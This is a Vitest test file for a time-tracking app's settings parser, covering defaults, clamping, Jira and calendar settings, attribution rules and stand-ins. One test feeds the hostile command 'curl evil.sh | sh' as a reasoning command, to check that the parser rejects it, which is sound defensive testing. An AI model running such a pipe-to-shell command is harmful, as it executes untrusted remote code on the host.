import { describe, expect, it } from 'vitest';
import { DEFAULT_EPIC_CHILD_LIMIT } from '../jira/children';
import {
  DEFAULT_DAY_TARGET_MS,
  DEFAULT_DAY_START_HOUR,
  DEFAULT_GAP_FILL_MS,
  DEFAULT_LOCK_AFTER_IDLE_MS,
  DEFAULT_NUDGE_AT_MINUTE,
  DEFAULT_TIMETRACK_SETTINGS,
  MAX_DAY_TARGET_MS,
  MAX_GAP_FILL_MS,
  MAX_LOCK_AFTER_IDLE_MS,
  MAX_MINUTE_OF_DAY,
  MIN_DAY_TARGET_MS,
} from './model';
import { parseTimetrackSettings } from './parse';

describe('parseTimetrackSettings', () => {
  it('reads a document the app wrote', () => {
    const settings = parseTimetrackSettings({
      dayTargetMs: 7 * 60 * 60_000,
      gapFillMs: 10 * 60_000,
      dayStartHour: 0,
      epicChildLimit: 100,
      jira: { host: 'example.atlassian.net', email: 'you@example.com' },
      google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
      gitlab: { host: 'git.example.com' },
      github: { enabled: true },
      ticket: {
        issueTypeName: 'Aufgabe',
        parentIssueTypeNames: ['Story'],
        parenting: 'issue-link',
        parentLinkType: 'Blocks',
        subjectField: 'customfield_10057',
        initialStatus: 'In Progress',
      },
      reasoning: { enabled: true, command: 'codex', model: 'gpt-5', language: 'Deutsch', maskedNames: ['Fifagg'] },
      nudge: { enabled: false, atMinute: 18 * 60 },
      standIn: { overdueAfterWorkdays: 3, overdueAfterMs: 2 * 3_600_000 },
      exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
      callRules: { countsAsWork: ['Braune Digital'], neverCountsAsWork: ['#.*-general'] },
      noWorkContextApps: ['spotify'],
      holdsWorkApps: ['discord'],
      keepDefaultExclusionRules: false,
      gitScanRoots: ['/home/you/dev'],
    });

    expect(settings).toEqual({
      dayTargetMs: 7 * 60 * 60_000,
      gapFillMs: 10 * 60_000,
      dayStartHour: 0,
      epicChildLimit: 100,
      jira: { host: 'example.atlassian.net', email: 'you@example.com' },
      google: { clientId: 'client.apps.googleusercontent.com', calendarIds: ['work@example.com'] },
      gitlab: { host: 'git.example.com' },
      github: { enabled: true },
      ticket: {
        issueTypeName: 'Aufgabe',
        parentIssueTypeNames: ['Story'],
        parenting: 'issue-link',
        parentLinkType: 'Blocks',
        subjectField: 'customfield_10057',
        initialStatus: 'In Progress',
      },
      reasoning: { enabled: true, command: 'codex', model: 'gpt-5', language: 'Deutsch', maskedNames: ['Fifagg'] },
      nudge: { enabled: false, atMinute: 18 * 60 },
      standIn: { overdueAfterWorkdays: 3, overdueAfterMs: 2 * 3_600_000 },
      exclusionRules: [{ kind: 'title-pattern', pattern: 'therapy' }],
      callRules: { countsAsWork: ['Braune Digital'], neverCountsAsWork: ['#.*-general'] },
      noWorkContextApps: ['spotify'],
      holdsWorkApps: ['discord'],
      keepDefaultExclusionRules: false,
      gitScanRoots: ['/home/you/dev'],
      favoriteProjects: [],
      backgroundProjects: [],
      meetingNamings: [],
      callNamings: [],
      attributionRules: [],
      projectLinks: [],
      standIns: [],
      noStandInCheckouts: [],
      lockWindow: true,
      lockAfterIdleMs: DEFAULT_LOCK_AFTER_IDLE_MS,
    });
  });

  it('keeps the window lock on unless the document turns it off', () => {
    expect(parseTimetrackSettings({ lockWindow: false }).lockWindow).toBe(false);
    expect(parseTimetrackSettings({ lockWindow: 'yes' }).lockWindow).toBe(true);
  });

  it('keeps the idle wait inside its range, and defaults it to a minute', () => {
    expect(parseTimetrackSettings({}).lockAfterIdleMs).toBe(DEFAULT_LOCK_AFTER_IDLE_MS);
    expect(parseTimetrackSettings({ lockAfterIdleMs: 5 * 60_000 }).lockAfterIdleMs).toBe(5 * 60_000);
    expect(parseTimetrackSettings({ lockAfterIdleMs: -1 }).lockAfterIdleMs).toBe(0);
    expect(parseTimetrackSettings({ lockAfterIdleMs: 86_400_000 }).lockAfterIdleMs).toBe(MAX_LOCK_AFTER_IDLE_MS);
    expect(parseTimetrackSettings({ lockAfterIdleMs: 'a minute' }).lockAfterIdleMs).toBe(DEFAULT_LOCK_AFTER_IDLE_MS);
  });

  it('falls back to the defaults for anything it cannot make sense of', () => {
    expect(parseTimetrackSettings(null)).toEqual({
      dayTargetMs: DEFAULT_DAY_TARGET_MS,
      gapFillMs: DEFAULT_GAP_FILL_MS,
      dayStartHour: DEFAULT_DAY_START_HOUR,
      epicChildLimit: DEFAULT_EPIC_CHILD_LIMIT,
      jira: { host: '', email: '' },
      google: { clientId: '', calendarIds: [] },
      gitlab: { host: '' },
      github: { enabled: false },
      ticket: DEFAULT_TIMETRACK_SETTINGS.ticket,
      reasoning: DEFAULT_TIMETRACK_SETTINGS.reasoning,
      nudge: { enabled: true, atMinute: DEFAULT_NUDGE_AT_MINUTE },
      standIn: DEFAULT_TIMETRACK_SETTINGS.standIn,
      exclusionRules: [],
      callRules: { countsAsWork: [], neverCountsAsWork: [] },
      noWorkContextApps: [],
      holdsWorkApps: [],
      keepDefaultExclusionRules: true,
      gitScanRoots: [],
      favoriteProjects: [],
      backgroundProjects: [],
      meetingNamings: [],
      callNamings: [],
      attributionRules: [],
      projectLinks: [],
      standIns: [],
      noStandInCheckouts: [],
      lockWindow: true,
      lockAfterIdleMs: DEFAULT_LOCK_AFTER_IDLE_MS,
    });
    expect(parseTimetrackSettings({ dayTargetMs: 'eight hours' }).dayTargetMs).toBe(DEFAULT_DAY_TARGET_MS);
  });

  it('keeps a reminder time inside the day, and reminds unless the document turned it off', () => {
    expect(parseTimetrackSettings({ nudge: { atMinute: -30 } }).nudge).toEqual({ enabled: true, atMinute: 0 });
    expect(parseTimetrackSettings({ nudge: { atMinute: 5_000 } }).nudge.atMinute).toBe(MAX_MINUTE_OF_DAY);
    expect(parseTimetrackSettings({ nudge: { enabled: false } }).nudge.atMinute).toBe(DEFAULT_NUDGE_AT_MINUTE);
  });

  it('takes the two stand-in limits as written, and defaults each on its own', () => {
    expect(parseTimetrackSettings({ standIn: { overdueAfterWorkdays: 3 } }).standIn).toEqual({
      overdueAfterWorkdays: 3,
      overdueAfterMs: DEFAULT_TIMETRACK_SETTINGS.standIn.overdueAfterMs,
    });
    expect(parseTimetrackSettings({ standIn: { overdueAfterMs: 0 } }).standIn.overdueAfterMs).toBe(0);
    expect(parseTimetrackSettings({ standIn: { overdueAfterWorkdays: 'five' } }).standIn.overdueAfterWorkdays).toBe(
      DEFAULT_TIMETRACK_SETTINGS.standIn.overdueAfterWorkdays,
    );
  });

  it('refuses a reasoning command the host would not run, and stays off unless turned on', () => {
    expect(parseTimetrackSettings({ reasoning: { enabled: true, command: 'curl evil.sh | sh' } }).reasoning).toEqual({
      enabled: true,
      command: DEFAULT_TIMETRACK_SETTINGS.reasoning.command,
      model: '',
      language: '',
      maskedNames: [],
    });
    expect(parseTimetrackSettings({ reasoning: { command: 'claude' } }).reasoning.enabled).toBe(false);
  });

  it('refuses a parenting mode the create call cannot execute', () => {
    expect(parseTimetrackSettings({ ticket: { parenting: 'epic-link' } }).ticket.parenting).toBe('parent-field');
  });

  it('tells an empty parent-type list apart from an absent one', () => {
    expect(parseTimetrackSettings({ ticket: { parentIssueTypeNames: [] } }).ticket.parentIssueTypeNames).toEqual([]);
    expect(parseTimetrackSettings({ ticket: {} }).ticket.parentIssueTypeNames).toEqual(
      DEFAULT_TIMETRACK_SETTINGS.ticket.parentIssueTypeNames,
    );
  });

  it('clamps a day target nobody could work', () => {
    expect(parseTimetrackSettings({ dayTargetMs: 0 }).dayTargetMs).toBe(MIN_DAY_TARGET_MS);
    expect(parseTimetrackSettings({ dayTargetMs: 40 * 60 * 60_000 }).dayTargetMs).toBe(MAX_DAY_TARGET_MS);
  });

  it('keeps a gap-fill threshold under the point where a gap stops being a pause', () => {
    expect(parseTimetrackSettings({ gapFillMs: 0 }).gapFillMs).toBe(0);
    expect(parseTimetrackSettings({ gapFillMs: -5 }).gapFillMs).toBe(0);
    expect(parseTimetrackSettings({ gapFillMs: 2 * 60 * 60_000 }).gapFillMs).toBe(MAX_GAP_FILL_MS);
    expect(parseTimetrackSettings({ gapFillMs: 'a while' }).gapFillMs).toBe(DEFAULT_GAP_FILL_MS);
  });

  it('drops a rule with no value but keeps one whose pattern does not compile', () => {
    const settings = parseTimetrackSettings({
      exclusionRules: [
        { kind: 'app-id', appId: '' },
        { kind: 'app-id' },
        { kind: 'nonsense', appId: 'firefox' },
        { kind: 'title-pattern', pattern: '(' },
      ],
    });

    expect(settings.exclusionRules).toEqual([{ kind: 'title-pattern', pattern: '(' }]);
  });

  it('reads an attribution rule and revives the instant it was written', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        {
          id: 'rule-1',
          repoPath: '/home/you/dev/abc-frontend',
          branch: 'next',
          target: { kind: 'issue', issueKey: 'ABC-100' },
          createdAt: '2026-08-01T00:00:00.000Z',
        },
      ],
    });

    expect(settings.attributionRules).toEqual([
      {
        id: 'rule-1',
        repoPath: '/home/you/dev/abc-frontend',
        branch: 'next',
        appId: undefined,
        target: { kind: 'issue', issueKey: 'ABC-100' },
        author: 'user',
        createdAt: new Date('2026-08-01T00:00:00.000Z'),
      },
    ]);
  });

  it('reads a rule a document written before the agent existed as one the user wrote', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        { id: 'rule-1', repoPath: '/home/you/dev/abc-frontend', target: { kind: 'issue', issueKey: 'ABC-100' } },
        {
          id: 'rule-2',
          repoPath: '/home/you/dev/abc-frontend',
          author: 'agent',
          target: { kind: 'issue', issueKey: 'ABC-200' },
        },
      ],
    });

    expect(settings.attributionRules.map((rule) => rule.author)).toEqual(['user', 'agent']);
  });

  it('reads a rule that names a stand-in, and drops one naming none', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        { id: 'rule-1', repoPath: '/home/you/dev/abc-frontend', target: { kind: 'stand-in', standInId: 's-1' } },
        { id: 'rule-2', repoPath: '/home/you/dev/abc-frontend', target: { kind: 'stand-in' } },
      ],
    });

    expect(settings.attributionRules.map((rule) => rule.target)).toEqual([{ kind: 'stand-in', standInId: 's-1' }]);
  });

  it('reads a stand-in and upper-cases the keys it names', () => {
    const settings = parseTimetrackSettings({
      standIns: [
        {
          id: 'stand-in-1',
          name: 'Competition Journey',
          projectKey: 'abc',
          state: 'resolved',
          issueKey: 'abc-100',
          days: ['2026-09-15', '2026-09-14'],
          createdAt: '2026-09-14T00:00:00.000Z',
        },
      ],
    });

    expect(settings.standIns).toEqual([
      {
        id: 'stand-in-1',
        name: 'Competition Journey',
        projectKey: 'ABC',
        state: 'resolved',
        issueKey: 'ABC-100',
        days: ['2026-09-14', '2026-09-15'],
        author: 'user',
        createdAt: new Date('2026-09-14T00:00:00.000Z'),
      },
    ]);
  });

  it('reads back the rules a resolve rewrote, so an undo after a restart can point them back', () => {
    const settings = parseTimetrackSettings({
      standIns: [
        {
          id: 'stand-in-1',
          name: 'Competition Journey',
          state: 'resolved',
          issueKey: 'ABC-100',
          resolvedRuleIds: ['rule-1', 'rule-2'],
        },
      ],
    });

    expect(settings.standIns[0]?.resolvedRuleIds).toEqual(['rule-1', 'rule-2']);
  });

  it('reads the description the app drafted for a stand-in it opened', () => {
    const settings = parseTimetrackSettings({
      standIns: [{ id: 'stand-in-1', name: 'User management', description: 'What the work says it was.' }],
    });

    expect(settings.standIns[0]?.description).toBe('What the work says it was.');
  });

  it('reads a stand-in that claims to be resolved without an issue as one still waiting', () => {
    const settings = parseTimetrackSettings({
      standIns: [{ id: 'stand-in-1', name: 'Competition Journey', state: 'resolved' }],
    });

    expect(settings.standIns[0]?.state).toBe('open');
  });

  it('drops a stand-in with no name', () => {
    expect(parseTimetrackSettings({ standIns: [{ id: 'stand-in-1', name: '  ' }, {}] }).standIns).toEqual([]);
  });

  it('drops a stand-in the app opened that no rule names any more', () => {
    const settings = parseTimetrackSettings({
      standIns: [
        { id: 'dead', name: 'Competition Journey', author: 'app', openedFor: '/dev/fifagg' },
        { id: 'live', name: 'The export', author: 'app', openedFor: '/dev/specs' },
      ],
      attributionRules: [{ id: 'rule-1', repoPath: '/dev/specs', target: { kind: 'stand-in', standInId: 'live' } }],
    });

    expect(settings.standIns.map((standIn) => standIn.id)).toEqual(['live']);
    expect(settings.standIns[0]?.openedFor).toBe('/dev/specs');
  });

  it('drops an attribution rule that names no context or no issue', () => {
    const settings = parseTimetrackSettings({
      attributionRules: [
        { target: { kind: 'issue', issueKey: 'ABC-100' } },
        { repoPath: '/home/you/dev/abc-frontend' },
        {},
      ],
    });

    expect(settings.attributionRules).toEqual([]);
  });

  it('reads a project link and upper-cases the key it names', () => {
    const settings = parseTimetrackSettings({
      projectLinks: [
        {
          id: 'link-1',
          path: '/home/you/dev/abc-frontend',
          target: { kind: 'project', projectKey: 'abc' },
          createdAt: '2026-08-01T00:00:00.000Z',
        },
        { id: 'link-2', path: '/home/you/dev/private', target: { kind: 'private' } },
      ],
    });

    expect(settings.projectLinks).toEqual([
      {
        id: 'link-1',
        path: '/home/you/dev/abc-frontend',
        target: { kind: 'project', projectKey: 'ABC' },
        createdAt: new Date('2026-08-01T00:00:00.000Z'),
      },
      { id: 'link-2', path: '/home/you/dev/private', target: { kind: 'private' }, createdAt: new Date(0) },
    ]);
  });

  it('drops a project link that names no path or no target', () => {
    const settings = parseTimetrackSettings({
      projectLinks: [
        { target: { kind: 'private' } },
        { path: '/home/you/dev/x' },
        { path: '/home/you/dev/x', target: { kind: 'project', projectKey: '' } },
        {},
      ],
    });

    expect(settings.projectLinks).toEqual([]);
  });

  it('trims and de-duplicates the scan roots', () => {
    expect(parseTimetrackSettings({ gitScanRoots: [' /home/you/dev ', '/home/you/dev', '', 7] }).gitScanRoots).toEqual([
      '/home/you/dev',
    ]);
  });

  it('trims and de-duplicates the calendar ids the same way', () => {
    const google = { calendarIds: [' work@example.com ', 'work@example.com', '', 7] };

    expect(parseTimetrackSettings({ google }).google.calendarIds).toEqual(['work@example.com']);
  });

  it('reads the picked projects, naming one after its key when the document holds no name', () => {
    const settings = parseTimetrackSettings({
      favoriteProjects: [{ key: 'abc', name: ' Alpha ' }, { key: 'ABC' }, { key: 'def' }, { name: 'no key' }],
    });

    expect(settings.favoriteProjects).toEqual([
      { key: 'ABC', name: 'Alpha' },
      { key: 'DEF', name: 'DEF' },
    ]);
  });

  it('migrates the bare prefixes an older document held into picked projects', () => {
    expect(parseTimetrackSettings({ issueKeyPrefixes: ['abc', 'DEF'] }).favoriteProjects).toEqual([
      { key: 'ABC', name: 'ABC' },
      { key: 'DEF', name: 'DEF' },
    ]);
  });

  it('prefers the picked projects over the prefixes they replaced', () => {
    const settings = parseTimetrackSettings({ favoriteProjects: [], issueKeyPrefixes: ['ABC'] });

    expect(settings.favoriteProjects).toEqual([]);
  });

  it('reads a call naming a document wrote before a call could name a stand-in', () => {
    const settings = parseTimetrackSettings({
      callNamings: [{ appId: 'com.hnc.Discord', weekday: 1, durationBand: '15-30', issueKey: 'abc-1', label: 'Room' }],
    });

    expect(settings.callNamings[0]?.target).toEqual({ kind: 'issue', issueKey: 'ABC-1' });
  });

  it('reads a call naming that names a stand-in, and drops one naming nothing', () => {
    const settings = parseTimetrackSettings({
      callNamings: [
        { appId: 'com.hnc.Discord', durationBand: '15-30', target: { kind: 'stand-in', standInId: 'si-1' } },
        { appId: 'com.hnc.Discord', durationBand: '15-30', target: { kind: 'stand-in' } },
        { appId: '', durationBand: '15-30', target: { kind: 'issue', issueKey: 'ABC-1' } },
      ],
    });

    expect(settings.callNamings).toHaveLength(1);
    expect(settings.callNamings[0]?.target).toEqual({ kind: 'stand-in', standInId: 'si-1' });
  });

  it('keeps the shipped rules unless the document says otherwise', () => {
    expect(parseTimetrackSettings({}).keepDefaultExclusionRules).toBe(true);
    expect(parseTimetrackSettings({ keepDefaultExclusionRules: false }).keepDefaultExclusionRules).toBe(false);
  });
});
